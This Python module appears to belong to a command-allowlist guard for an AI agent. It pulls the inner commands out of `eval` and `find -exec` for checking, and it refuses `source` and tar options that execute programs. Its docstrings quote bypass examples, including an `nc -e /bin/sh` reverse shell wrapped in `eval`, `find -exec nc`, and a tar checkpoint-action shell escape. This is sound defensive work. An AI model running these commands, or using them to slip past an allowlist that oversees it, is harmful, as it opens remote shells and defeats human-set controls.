"""Commands whose argument is another command.

`bash -c` was recognised as this shape from the start, and `shell_validators`
exists for it. Four more were not, and all four are in `BASE_COMMANDS`, so each
was an allowlisted word with an unjudged command line behind it:

===============================  ====================================
`eval "nc -e /bin/sh host 1"`    the string is shell source
`source evil.sh` / `. evil.sh`   the file is shell source
`find . -exec nc … \\;`           `-exec` runs its argument per match
`tar --checkpoint-action=exec=`  and `--to-command=`, same idea
===============================  ====================================

Two of them can be judged and two cannot, and the difference is whether the
command is *in* the line. `source` and tar's hooks name a **file**, whose
contents an agent may have written a moment ago and may rewrite between this
check and the read, so they are refused outright — the reason
`shell_validators` already refuses `bash script.sh`. Those two are ordinary
validators, and they live here.

`eval` and `find -exec` name what they will run, so the naming can be judged.
This module **extracts** those command lines and judges none of them:
`eval_inner_command` and `find_exec_command_lines` are pure text, and
`command_guard` recurses on what they return, exactly as it already does for
`$(…)`.

That split is what keeps the import graph acyclic. The first version had this
module call `validate_command_line` directly, which put `command_guard` →
`validator` → `validator_registry` → `exec_validators` → `command_guard` in a
loop; both edges were function-level imports written to dodge it, and a lazy
import whose job is to hide a cycle is the cycle. Recursion belongs to the one
module that owns recursion.
"""

from __future__ import annotations

import shlex

from .parser import _cross_platform_basename
from .validation_models import ValidationResult

__all__ = [
    "eval_inner_command",
    "find_exec_command_lines",
    "validate_source_command",
    "validate_tar_command",
]

#: `find` options that take a command line, terminated by `;` or `+`.
_FIND_EXEC_OPTIONS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})

#: tar options that hand a command to the shell. `--checkpoint-action` accepts
#: several verbs and only `exec=` runs anything, but the others are
#: `dot`/`echo`/`sleep`/`ttyout` — refusing the option wholesale costs a
#: progress indicator and removes the need to parse its grammar.
_TAR_EXEC_OPTIONS = ("--checkpoint-action", "--to-command", "--use-compress-program")


def _tokenize(command_string: str) -> list[str] | None:
    try:
        return shlex.split(command_string)
    except ValueError:
        return None


def eval_inner_command(command_string: str) -> tuple[bool, str | None]:
    """`(is_eval, inner)` for the command line `eval` would run.

    `eval id` and `eval "id"` are the same call, so the arguments are joined
    back into one line — which is what the shell does with them too.

    Three answers, and the caller has to tell them apart:

    ``(False, None)``  not an `eval`; nothing to judge
    ``(True, None)``   an `eval` this module could not read — a refusal
    ``(True, text)``   an `eval` that runs `text`; `""` is a bare `eval`,
                       which runs nothing and is harmless

    A single `str` return cannot carry that: the empty string would have to
    mean both "runs nothing" and "unreadable", and one of those is a refusal.
    """
    tokens = _tokenize(command_string)
    if tokens is None:
        head = command_string.strip().split(" ", 1)[0]
        if _cross_platform_basename(head) == "eval":
            return True, None
        return False, None
    if not tokens or _cross_platform_basename(tokens[0]) != "eval":
        return False, None
    return True, " ".join(tokens[1:]).strip()


def find_exec_command_lines(command_string: str) -> tuple[bool, list[str] | None]:
    """`(is_find, lines)` for the command lines `find -exec` and friends run.

    The same three answers as `eval_inner_command`, for the same reason:
    ``(True, [])`` is a `find` that runs nothing — the common case, and not a
    refusal — while ``(True, None)`` is a `find` this module could not read,
    which is.

    The argument list runs to a `;` or `+` terminator. `{}` is find's
    placeholder for the matched path — an argument, never the command — and it
    is dropped so that `-exec grep -l x {} +` reads as `grep -l x`.
    """
    tokens = _tokenize(command_string)
    if tokens is None:
        head = command_string.strip().split(" ", 1)[0]
        if _cross_platform_basename(head) == "find":
            return True, None
        return False, None
    if not tokens or _cross_platform_basename(tokens[0]) != "find":
        return False, None

    lines: list[str] = []
    index = 1
    while index < len(tokens):
        if tokens[index] not in _FIND_EXEC_OPTIONS:
            index += 1
            continue

        index += 1
        inner_tokens: list[str] = []
        while index < len(tokens) and tokens[index] not in (";", "+"):
            if tokens[index] != "{}":
                inner_tokens.append(tokens[index])
            index += 1
        index += 1  # step over the terminator

        inner = " ".join(inner_tokens).strip()
        if inner:
            lines.append(inner)

    return True, lines


def validate_source_command(command_string: str) -> ValidationResult:
    """Refuse `source file` and `. file`.

    The file's contents are not in the command, so there is nothing to judge —
    and an agent that just wrote the file is exactly the case this has to
    cover. `bash script.sh` is refused for this reason already; sourcing is the
    same act without the subprocess.
    """
    tokens = _tokenize(command_string)
    if tokens is None:
        return False, "Could not parse source command"
    if not tokens:
        return True, ""

    name = _cross_platform_basename(tokens[0])
    if name not in ("source", "."):
        return True, ""

    operands = [token for token in tokens[1:] if not token.startswith("-")]
    if not operands:
        return True, ""

    return (
        False,
        f"Sourcing '{operands[0]}' is not allowed: the file's contents bypass "
        "the command allowlist. Run the commands inline instead.",
    )


def validate_tar_command(command_string: str) -> ValidationResult:
    """Refuse the tar options that hand a command to the shell.

    `tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/tmp/evil .` is
    a shell escape wearing an archiver's name, and the command it runs is a
    path — a file, so unjudgeable for the same reason `source` is.
    """
    tokens = _tokenize(command_string)
    if tokens is None:
        # A tar line that will not parse is not one to guess at.
        tokens = command_string.split()
    if not tokens or _cross_platform_basename(tokens[0]) != "tar":
        return True, ""

    for token in tokens[1:]:
        for option in _TAR_EXEC_OPTIONS:
            if token == option or token.startswith(f"{option}="):
                return (
                    False,
                    f"tar option '{option}' runs an external command and is "
                    "not allowed: its argument bypasses the command allowlist.",
                )
    return True, ""
